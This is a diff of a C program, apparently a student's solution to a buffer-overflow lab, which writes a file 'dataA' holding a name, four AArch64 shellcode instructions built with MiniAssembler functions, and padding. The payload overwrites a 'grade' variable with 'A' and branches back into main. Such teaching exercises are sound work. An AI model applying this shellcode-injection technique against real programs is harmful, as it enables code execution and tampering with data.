@@ -15,26 +15,50 @@ int main(void) {
     FILE *fp;
     int i;
     uint64_t shellcode_addr;
+    unsigned int instr1, instr2, instr3, instr4;
+    unsigned char *bytes;
     
     fp = fopen("dataA", "wb");
     
-    /* Write student name */
+    /* write student name */
     fwrite("Kevin", 1, 5, fp);
     
-    /* Write null terminator */
+    /* write null terminator */
     fputc('\0', fp);
     
-    /* write shellcode as raw bytes (16 bytes total) */
-    /* bytes implement: set grade='A', then branch back to main */
-    unsigned char shellcode[] = {
-        0x00, 0x88, 0x84, 0x10,  /* adr x0, 0x420044 (grade address)*/
-        0x21, 0x08, 0x80, 0x52,  /* mov w1, #0x41 ('A') */
-        0x01, 0x00, 0x00, 0x39,  /* strb w1, [x0] */
-        0x0f, 0x81, 0xff, 0x17   /* b 0x40089c (main+64) */
-    };
+    /* generate shellcode using miniassembler functions */
+    /* instruction 1: adr x0, 0x420044 (load grade address) */
+    instr1 = MiniAssembler_adr(0, 0x420044, 0x42005e);
     
-    /* Write shellcode bytes */
-    fwrite(shellcode, 1, 16, fp);
+    /* instruction 2: mov w1, #0x41 (load 'A') */
+    instr2 = MiniAssembler_mov(1, 0x41);
+    
+    /* instruction 3: strb w1, [x0] (store 'A' at grade) */
+    instr3 = MiniAssembler_strb(1, 0);
+    
+    /* instruction 4: b 0x40089c (branch back to main+64) */
+    instr4 = MiniAssembler_b(0x40089c, 0x42006a);
+    
+    /* write shellcode bytes (4 instructions, 16 bytes total) */
+    bytes = (unsigned char *)&instr1;
+    for (i = 0; i < 4; i++) {
+        fputc(bytes[i], fp);
+    }
+    
+    bytes = (unsigned char *)&instr2;
+    for (i = 0; i < 4; i++) {
+        fputc(bytes[i], fp);
+    }
+    
+    bytes = (unsigned char *)&instr3;
+    for (i = 0; i < 4; i++) {
+        fputc(bytes[i], fp);
+    }
+    
+    bytes = (unsigned char *)&instr4;
+    for (i = 0; i < 4; i++) {
+        fputc(bytes[i], fp);
+    }
     
     /* padding to fill remaining buf space (48 - 6 - 16 = 26 bytes) */
     for (i = 0; i < 26; i++) {
